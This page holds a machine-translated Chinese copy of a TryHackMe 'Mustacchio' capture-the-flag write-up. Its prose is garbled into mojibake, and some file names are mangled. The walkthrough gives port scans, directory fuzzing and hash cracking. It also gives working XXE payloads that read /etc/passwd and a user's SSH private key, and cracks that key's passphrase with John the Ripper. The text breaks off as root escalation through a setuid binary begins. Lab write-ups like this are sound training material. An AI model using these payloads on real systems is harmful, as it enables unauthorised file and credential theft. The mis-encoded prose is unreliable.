<html>
<head>
<title>TryHackMe Writeup: Mustacchio</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMeæŠ¥é“:ç©†æ–¯å¡”åŸºå¥¥</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/tryhackme-writeup-mustacchio-ee526a543d8a?source=collection_archive---------1-----------------------#2021-06-15">https://infosecwriteups.com/tryhackme-writeup-mustacchio-ee526a543d8a?source=collection_archive---------1-----------------------#2021-06-15</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="9577" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æœ¬æ–‡ä»‹ç»äº†æˆ‘è§£å†³<strong class="jp ir">ç©†æ–¯å¡”åŸºå¥¥</strong>å¤ºæ——(CTF) <strong class="jp ir"> </strong>æŒ‘æˆ˜ã€<strong class="jp ir"> </strong>ç”¨æˆ·<em class="kl"> zyeinn </em>åœ¨TryHackMeå¹³å°ä¸Šåˆ›å»ºçš„å…è´¹æˆ¿é—´çš„æ–¹æ³•ã€‚æˆ‘åœ¨ä¸‹é¢çš„å‚è€ƒèµ„æ–™ä¸­æä¾›äº†TryHackMeå¹³å°çš„é“¾æ¥ï¼Œä¾›æœ‰å…´è¶£å°è¯•è¿™æ¬¾CTFçš„äººä½¿ç”¨ã€‚</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/570d9913a6ea034373712a119e39af5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:606/format:webp/1*rBWLvpdui6Vx9gw7if2VzA.png"/></div></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="1800" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">æ”¾å¼ƒ</h1><p id="0ccb" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">æˆ‘å–œæ¬¢åœ¨ä¸€ç¯‡æ–‡ç« ä¹‹å‰æ·»åŠ ä¸€ä¸ªç®€çŸ­çš„å…è´£å£°æ˜ï¼Œä»¥é¼“åŠ±äººä»¬åœ¨é˜…è¯»æœ¬æ–‡ä¹‹å‰å°è¯•ä¸€ä¸‹è¿™ä¸ªæˆ¿é—´ï¼Œå› ä¸ºåœ¨è¿™ç¯‡æ–‡ç« ä¸­æ˜¾ç„¶ä¼šæœ‰<strong class="jp ir">å‰§é€</strong><strong class="jp ir"/>ã€‚æˆ‘ç›¸ä¿¡ï¼Œå¦‚æœä½ å…ˆè‡ªå·±å°è¯•ï¼Œç„¶ååœ¨é‡åˆ°å›°éš¾æˆ–éœ€è¦æç¤ºæ—¶å†æ¥å†™è¿™ç¯‡æ–‡ç« ï¼Œä½ ä¼šæ›´å–œæ¬¢CTFã€‚å› æ­¤ï¼Œæ²¡æœ‰ä»»ä½•è¿›ä¸€æ­¥çš„æ‹–å»¶ï¼Œè®©æˆ‘ä»¬å¼€å§‹å§ï¼</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="f71f" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">æŒ‘æˆ˜ç®€ä»‹</h1><blockquote class="me mf mg"><p id="bd43" class="jn jo kl jp b jq jr js jt ju jv jw jx mh jz ka kb mi kd ke kf mj kh ki kj kk ij bi translated">éƒ¨ç½²å¹¶ç ´åæœºå™¨ï¼</p></blockquote><p id="e3b7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¦å®ŒæˆæŒ‘æˆ˜ï¼Œéœ€è¦æäº¤ä¸¤ä¸ªæ ‡å¿—:</p><ul class=""><li id="2002" class="mk ml iq jp b jq jr ju jv jy mm kc mn kg mo kk mp mq mr ms bi translated"><strong class="jp ir">ç”¨æˆ·æ ‡å¿—</strong></li><li id="6462" class="mk ml iq jp b jq mt ju mu jy mv kc mw kg mx kk mp mq mr ms bi translated"><strong class="jp ir">æ ¹æ ‡å¿—</strong></li></ul></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="7b70" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">åˆ—ä¸¾</h1><p id="e762" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">æˆ‘å¼€å§‹ç”¨NMAPæ‰«ææ‰€æœ‰æ‰“å¼€çš„ç«¯å£æ¥æšä¸¾ç›®æ ‡æœºå™¨:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="158b" class="nd lc iq mz b gy ne nf l ng nh">nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.255.169</span><span id="e570" class="nd lc iq mz b gy ni nf l ng nh">PORT     STATE SERVICE        REASON<br/>22/tcp   open  ssh            syn-ack ttl 61<br/>80/tcp   open  http           syn-ack ttl 61<br/>8765/tcp open  ultraseek-http syn-ack ttl 61</span></pre><p id="89cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘çœ‹åˆ°æ‰«æå‘ç°ä¸‰ä¸ªç«¯å£æ‰“å¼€(å³22ã€80å’Œ8765)ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä½¿ç”¨NMAPæ‰«æè¿è¡Œåœ¨è¿™äº›ç«¯å£å’ŒNMAPè„šæœ¬ä¸Šçš„æœåŠ¡ï¼Œä»¥æ‰¾åˆ°ä»»ä½•å¸¸è§çš„æ¼æ´:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="e3b0" class="nd lc iq mz b gy ne nf l ng nh">nmap -sV -sC -Pn -v -p 22,80,8765 -oN nmap-report 10.10.225.169</span><span id="a75f" class="nd lc iq mz b gy ni nf l ng nh">PORT     STATE SERVICE VERSION<br/>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)<br/>|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)<br/>|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)<br/>80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))<br/>| http-methods: <br/>|_  Supported Methods: GET HEAD POST OPTIONS<br/>| http-robots.txt: 1 disallowed entry <br/>|_/<br/>|_http-server-header: Apache/2.4.18 (Ubuntu)<br/>|_http-title: Mustacchio | Home<br/>8765/tcp open  http    nginx 1.10.3 (Ubuntu)<br/>| http-methods: <br/>|_  Supported Methods: GET HEAD POST<br/>|_http-server-header: nginx/1.10.3 (Ubuntu)<br/>|_http-title: Mustacchio | Login<br/>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre><p id="3460" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">NMAPæ‰«æå®Œæˆåï¼Œæˆ‘å¯ä»¥çœ‹åˆ°ç«¯å£80å’Œç«¯å£8765ä¸Šæœ‰ä¸¤ä¸ªå¯ç”¨çš„ç½‘ç«™ã€‚</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="c09d" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">ç«¯å£80 â€” HTTPç½‘ç«™åˆ†æ</h1><p id="fed1" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">æˆ‘é¦–å…ˆæ£€æŸ¥äº†ç«¯å£80ä¸Šå¯ç”¨çš„ç½‘ç«™ï¼Œå¹¶ä½¿ç”¨<strong class="jp ir"> FFuF </strong>å¯¹å…¶è¿›è¡Œæ¨¡ç³Šå¤„ç†ï¼Œä»¥æŸ¥æ‰¾ä»»ä½•éšè—çš„æ–‡ä»¶æˆ–ç›®å½•:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="45de" class="nd lc iq mz b gy ne nf l ng nh">ffuf -c -u <a class="ae nj" href="http://10.10.225.169/FUZZ" rel="noopener ugc nofollow" target="_blank">http://10.10.225.169/FUZZ</a> -w /usr/share/wordlists/dirb/common.txt -e .php,.old,.bak</span><span id="b1a8" class="nd lc iq mz b gy ni nf l ng nh">custom  [Status: 301, Size: 315, Words: 20, Lines: 10] # Interesting<br/>fonts   [Status: 301, Size: 314, Words: 20, Lines: 10]<br/>images  [Status: 301, Size: 315, Words: 20, Lines: 10]<br/>index.html     [Status: 200, Size: 1752, Words: 77, Lines: 73]<br/>robots.txt     [Status: 200, Size: 28, Words: 3, Lines: 3]<br/>server-status  [Status: 403, Size: 278, Words: 20, Lines: 10]</span></pre><p id="b395" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç¿»çœ‹ä¸Šé¢çš„è¾“å‡ºï¼Œçœ‹åˆ°ä¸€ä¸ªåä¸º<em class="kl">/custom</em><em class="kl"/>çš„ç›®å½•ï¼Œåœ¨ç›®å½•ä¸­æ‰¾åˆ°ä¸€ä¸ªåä¸º<strong class="jp ir"> users.bak </strong>çš„æ–‡ä»¶ã€‚æˆ‘ä¸‹è½½äº†è¯¥æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å®ƒæ˜¯ä¸€ä¸ªSQLiteæ•°æ®åº“æ–‡ä»¶:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="a075" class="nd lc iq mz b gy ne nf l ng nh">$ file users.bak</span><span id="6da1" class="nd lc iq mz b gy ni nf l ng nh">users.bak: SQLite 3.x database, last written using SQLite version 3034001</span></pre><p id="f94e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨æ•°æ®åº“é‡Œé¢ï¼Œæˆ‘æ‰¾åˆ°äº†ä¸€ä¸ª<strong class="jp ir">ç”¨æˆ·å</strong>å’Œ<strong class="jp ir"> SHA1å“ˆå¸Œ</strong>ã€‚æˆ‘ç”¨ä¸€ä¸ªåœ¨çº¿å·¥å…·ç ´è§£äº†è¿™ä¸ªSHA1æ•£åˆ—ï¼Œæ‰¾å›äº†ç”¨æˆ·çš„å¯†ç :</p><p id="4da6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae nj" href="https://hashtoolkit.com/decrypt-sha1-hash/" rel="noopener ugc nofollow" target="_blank">https://hashtoolkit.com/decrypt-sha1-hash/</a></p><p id="adf5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘çš„ç¬¬ä¸€ååº”æ˜¯ä½¿ç”¨è¿™äº›å‡­è¯SSHåˆ°ç›®æ ‡æœºå™¨ï¼Œä½†æ˜¯è¿™ä¸èµ·ä½œç”¨ã€‚</p></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="5caa" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">ç«¯å£8765 â€” XMLå¤–éƒ¨å®ä½“(XEE)æ³¨å…¥</h1><p id="9717" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">æˆ‘è½¬åˆ°ç«¯å£8765ä¸Šçš„ç½‘ç«™ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªç®¡ç†å‘˜ç™»å½•é¢æ¿:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi nk"><img src="../Images/3efe9a76621980d7c65dd300405c5d43.png" data-original-src="https://miro.medium.com/v2/resize:fit:944/format:webp/1*abT0oaCPVaTe9SQYeUGXJA.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">ç®¡ç†å‘˜ç™»å½•é¢æ¿</figcaption></figure><p id="778e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä½¿ç”¨å‰é¢å‘ç°çš„å‡­è¯ï¼Œæˆ‘å¯ä»¥ç™»å½•åˆ°ç®¡ç†é¢æ¿ï¼Œå¹¶çœ‹åˆ°ä¸€ä¸ªç”¨äºæäº¤è¯„è®ºçš„ç½‘é¡µè¡¨å•:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi np"><img src="../Images/3ac916e9d4db358964db85ee38b43ea9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1174/format:webp/1*DM5sB-tqqIGLiKSHBHK2mg.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">ç”¨äºæ·»åŠ æ³¨é‡Šçš„Webè¡¨å•</figcaption></figure><p id="8fe9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æµè§ˆç½‘é¡µæºä»£ç ï¼Œæˆ‘å‘ç°äº†ä¸€äº›æœ‰è¶£çš„ä¿¡æ¯ã€‚ç¬¬ä¸€ä¸ªæ˜¯ä¸€æ®µJavaScriptï¼Œå®ƒæœ‰ä¸€ä¸ªåŒ…å«URLçš„æ³¨é‡Š(ä¾‹å¦‚ï¼Œ<em class="kl"> /auth/dontforget.bak </em>)ã€‚è„šæœ¬çš„å…¶ä½™éƒ¨åˆ†æ£€æŸ¥æäº¤è¾“å…¥çš„åŒºåŸŸæ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœæ˜¯ï¼Œåˆ›å»ºä¸€ä¸ªè­¦å‘Šæ¡†ï¼Œå‘Šè¯‰ç”¨æˆ·<strong class="jp ir">æ’å…¥XMLä»£ç ã€‚</strong>è¿™æš—ç¤ºäº†ç½‘ç«™å®¹æ˜“å—åˆ°XMLæ³¨å…¥çš„æ”»å‡»:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="f538" class="nd lc iq mz b gy ne nf l ng nh">&lt;script type="text/javascript"&gt;<br/>      //document.cookie = "Example=/auth/dontforget.bak"; <br/>      function checktarea() {<br/>      let tbox = document.getElementById("box").value;<br/>      if (tbox == null || tbox.length == 0) {<br/>        alert("Insert XML Code!")<br/>      }<br/>  }<br/>&lt;/script&gt;</span></pre><p id="4726" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä½¿ç”¨ä¸Šé¢æ‰¾åˆ°çš„URLï¼Œæˆ‘å¯ä»¥ä¸‹è½½<strong class="jp ir">don tfore . bak</strong>æ–‡ä»¶ï¼Œå¹¶çœ‹åˆ°ç½‘ç«™ç”¨äºæ·»åŠ è¯„è®ºçš„XMLç»“æ„:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="3496" class="nd lc iq mz b gy ne nf l ng nh">&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;comment&gt;<br/>  &lt;name&gt;Joe Hamd&lt;/name&gt;<br/>  &lt;author&gt;Barry Clad&lt;/author&gt;<br/>  &lt;com&gt;his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I couldâ€™ve done something more productive than reading this mindlessly and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now since this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You couldâ€™ve been playing with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.&lt;/com&gt;<br/>&lt;/comment&gt;</span></pre><p id="f327" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦ä¸€æ¡æœ‰è¶£çš„ä¿¡æ¯æ˜¯ä¸€ä¸ªå¼€å‘è€…çš„è¯„è®ºï¼Œç§°ä¸€ä¸ªåä¸º<strong class="jp ir"> Barry </strong>çš„ç”¨æˆ·å¯ä»¥ä½¿ç”¨ä»–çš„å¯†é’¥SSHåˆ°ç›®æ ‡æœºå™¨ã€‚</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="0157" class="nd lc iq mz b gy ne nf l ng nh">&lt;!-- Barry, you can now SSH in using your key!--&gt;</span></pre><p id="f99d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä½¿ç”¨ä¸Šé¢æ”¶é›†çš„ä¿¡æ¯ï¼Œæˆ‘ç°åœ¨å¯ä»¥å‡†å¤‡åˆ©ç”¨ç½‘ç«™ä¸­çš„XMLæ³¨å…¥æ¼æ´äº†ã€‚æˆ‘å‘ç°ä»¥ä¸‹èµ„æºå¯¹äºå­¦ä¹ æ›´å¤šå…³äºXMLæ³¨å…¥çš„çŸ¥è¯†å¾ˆæœ‰ç”¨:</p><div class="nq nr gp gr ns nt"><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity" rel="noopener  ugc nofollow" target="_blank"><div class="nu ab fo"><div class="nv ab nw cl cj nx"><h2 class="bd ir gy z fp ny fr fs nz fu fw ip bi translated">XXE - XEE - XMLå¤–éƒ¨å®ä½“</h2><div class="oa l"><h3 class="bd b gy z fp ny fr fs nz fu fw dk translated">XMLå®ä½“æ˜¯åœ¨XMLæ–‡æ¡£ä¸­è¡¨ç¤ºæ•°æ®é¡¹çš„ä¸€ç§æ–¹å¼ï¼Œè€Œä¸æ˜¯ä½¿ç”¨æ•°æ®æœ¬èº«â€¦</h3></div><div class="ob l"><p class="bd b dl z fp ny fr fs nz fu fw dk translated">book.hacktricks.xyz</p></div></div><div class="oc l"><div class="od l oe of og oc oh ks nt"/></div></div></a></div><p id="64e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»æ‰§è¡Œæ–°å®ä½“æµ‹è¯•å¼€å§‹ï¼Œä»¥ç¡®å®šç®€å•çš„æ–°å®ä½“å£°æ˜æ˜¯å¦å¯è¡Œã€‚ä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ç¡®ä¿ä½¿ç”¨å‰é¢åœ¨<strong class="jp ir">don tform et . bak</strong>æ–‡ä»¶ä¸­çœ‹åˆ°çš„XMLç»“æ„ã€‚å¯¹äºä¸‹é¢çš„XMLï¼Œå½“XMLè§£æå™¨è§£æå¤–éƒ¨å®ä½“æ—¶ï¼Œç»“æœåº”è¯¥åŒ…å«<em class="kl"> &lt; name &gt; </em>ä¸­çš„â€œJoe Hamdâ€å’Œ<em class="kl"> &lt; author &gt; </em>ä¸­çš„â€œXML Injectionâ€:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="3f31" class="nd lc iq mz b gy ne nf l ng nh">&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE replace [&lt;!ENTITY example "XML Injection"&gt; ]&gt;<br/>&lt;comment&gt;<br/>  &lt;name&gt;Joe Hamd&lt;/name&gt;<br/>  &lt;author&gt;&amp;example;&lt;/author&gt;<br/>&lt;com&gt;Test paragraph&lt;/com&gt;<br/>&lt;/comment&gt;</span></pre><p id="0d96" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™æ˜¯å¯è¡Œçš„ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°é¢„æœŸçš„è¾“å‡º:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi oi"><img src="../Images/2d49ed3925d8e0a825eafc4a57bff730.png" data-original-src="https://miro.medium.com/v2/resize:fit:1076/format:webp/1*dD8W4yK3HwBu8u8XNtgyIQ.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">æ–°å®ä½“æ”»å‡»</figcaption></figure><p id="0bec" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ¥ä¸‹æ¥ï¼Œæˆ‘è¯•ç€çœ‹çœ‹æ˜¯å¦å¯ä»¥è¯»å–æ–‡ä»¶<em class="kl"> /etc/passwd </em>çš„å†…å®¹:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="a144" class="nd lc iq mz b gy ne nf l ng nh">&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;<br/>&lt;comment&gt;<br/>  &lt;name&gt;Joe Hamd&lt;/name&gt;<br/>  &lt;author&gt;Joe&lt;/author&gt;<br/>&lt;com&gt;&amp;xxe;&lt;/com&gt;<br/>&lt;/comment&gt;</span></pre><p id="7343" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™ä¹Ÿæ˜¯æˆåŠŸçš„ï¼Œå› ä¸ºæˆ‘å¯ä»¥çœ‹åˆ°<em class="kl"> /etc/passwd </em>æ–‡ä»¶çš„å†…å®¹:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/10b95a66dcbabc096ec48cee743fa807.png" data-original-src="https://miro.medium.com/v2/resize:fit:1266/format:webp/1*h8d0wK6BSJrsN3E8A7gKDQ.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">è¯»å–/etc/passwdæ–‡ä»¶å†…å®¹</figcaption></figure><p id="88b2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨æˆ‘å·²ç»ç¡®è®¤æˆ‘å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œä¸‹ä¸€æ­¥æ˜¯æ ¹æ®å‰é¢æ‰¾åˆ°çš„å¼€å‘äººå‘˜æ³¨é‡Šæ£€ç´¢ç”¨æˆ·Barryçš„SSHå¯†é’¥:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="ac71" class="nd lc iq mz b gy ne nf l ng nh">&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;!DOCTYPE replace [&lt;!ENTITY xxe SYSTEM 'file:////home/barry/.ssh/id_rsa'&gt;]&gt;<br/>&lt;comment&gt;<br/>  &lt;name&gt;Joe Hamd&lt;/name&gt;<br/>  &lt;author&gt;Joe&lt;/author&gt;<br/>&lt;com&gt;&amp;xxe;&lt;/com&gt;<br/>&lt;/comment&gt;</span></pre><p id="c85f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä½¿ç”¨ä¸Šé¢çš„XMLæ³¨å…¥ï¼Œæˆ‘èƒ½å¤Ÿæ£€ç´¢SSHå¯†é’¥:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/64e07a4448747eb01fac508fae5c7d5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1304/format:webp/1*Ed-Uu3Hw1N3X1LUpJjKaYQ.png"/></div><figcaption class="nl nm gj gh gi nn no bd b be z dk translated">æ£€ç´¢ç”¨æˆ·Barryçš„SSHå¯†é’¥</figcaption></figure><p id="4821" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç°åœ¨æˆ‘æœ‰äº†SSHå¯†é’¥ï¼Œæˆ‘æ›´æ”¹äº†å¯†é’¥çš„æƒé™å¹¶å°è¯•ç™»å½•ï¼Œä½†æ˜¯ç³»ç»Ÿæç¤ºæˆ‘è¾“å…¥å¯†ç :</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="c3c1" class="nd lc iq mz b gy ne nf l ng nh">$ chmod 600 id_rsa</span><span id="4259" class="nd lc iq mz b gy ni nf l ng nh">$ ssh -i id_rsa barry@10.10.225.169<br/>Enter passphrase for key 'id_rsa':</span></pre><p id="079e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸ºäº†æ£€ç´¢SSHå¯†é’¥çš„å¯†ç ï¼Œæˆ‘ä½¿ç”¨å¼€è†›æ‰‹çº¦ç¿°æ¥ç ´è§£å®ƒ:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="5af0" class="nd lc iq mz b gy ne nf l ng nh"># Create a hash for John to crack<br/>$ python /usr/share/john/ssh2john.py id_rsa &gt; id_rsa.hash</span><span id="7374" class="nd lc iq mz b gy ni nf l ng nh"># Crack the Hash<br/>$ sudo john id_rsa.hash -wordlist=/home/kali/Downloads/Capture-The-Flag/Password-Lists/rockyou.txt</span></pre><p id="14a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¼€è†›æ‰‹çº¦ç¿°æˆåŠŸåœ°ä»å“ˆå¸Œä¸­æ£€ç´¢åˆ°äº†å¯†ç çŸ­è¯­ã€‚æˆ‘èƒ½å¤ŸSSHåˆ°ç›®æ ‡æœºå™¨å¹¶è·å¾—ç”¨æˆ·æ ‡å¿—:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="c5aa" class="nd lc iq mz b gy ne nf l ng nh">barry@mustacchio:~$ cat user.txt</span><span id="8923" class="nd lc iq mz b gy ni nf l ng nh">62d77a4d5f97d.........</span></pre></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="40bc" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">æ ¹æƒé™æå‡-è·¯å¾„å˜é‡</h1><p id="b3e9" class="pw-post-body-paragraph jn jo iq jp b jq lz js jt ju ma jw jx jy mb ka kb kc mc ke kf kg md ki kj kk ij bi translated">è·å¾—ç”¨æˆ·æ ‡å¿—åï¼Œæˆ‘å¼€å§‹å¯»æ‰¾ä¸€ç§æ–¹æ³•æ¥æå‡æˆ‘çš„ç‰¹æƒåˆ°rootã€‚æˆ‘åœ¨ç”¨æˆ·<em class="kl"> /home/joe </em>ç›®å½•ä¸‹å‘ç°äº†ä¸€ä¸ªåä¸º<strong class="jp ir"> live_log </strong>çš„ELFäºŒè¿›åˆ¶æ–‡ä»¶:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="ad13" class="nd lc iq mz b gy ne nf l ng nh">$ file live_log </span><span id="f945" class="nd lc iq mz b gy ni nf l ng nh">live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a45518964ad12abe, for GNU/Linux 3.2.0, not stripped</span></pre><p id="57af" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä½¿ç”¨<strong class="jp ir"> strings </strong>å‘½ä»¤ï¼Œæˆ‘å¯ä»¥çœ‹åˆ°äºŒè¿›åˆ¶æ–‡ä»¶æ­£åœ¨ä½¿ç”¨<strong class="jp ir"> tail </strong>å‘½ä»¤è¯»å–<em class="kl">/var/log/nginx/access . log</em>æ–‡ä»¶ä¸­çš„æœ€å10ä¸ªæ¡ç›®:</p><pre class="kn ko kp kq gt my mz na nb aw nc bi"><span id="36e1" class="nd lc iq mz b gy ne nf l ng nh">_ITM_registerTMCloneTable<br/>u+UH<br/>[]A\A]A^A_<br/>Live Nginx Log Reader<br/>tail -f /var/log/nginx/access.log  &lt;--- Interesting<br/>:*3$"<br/>GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0<br/>crtstuff.c</span></pre><p id="b60b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi 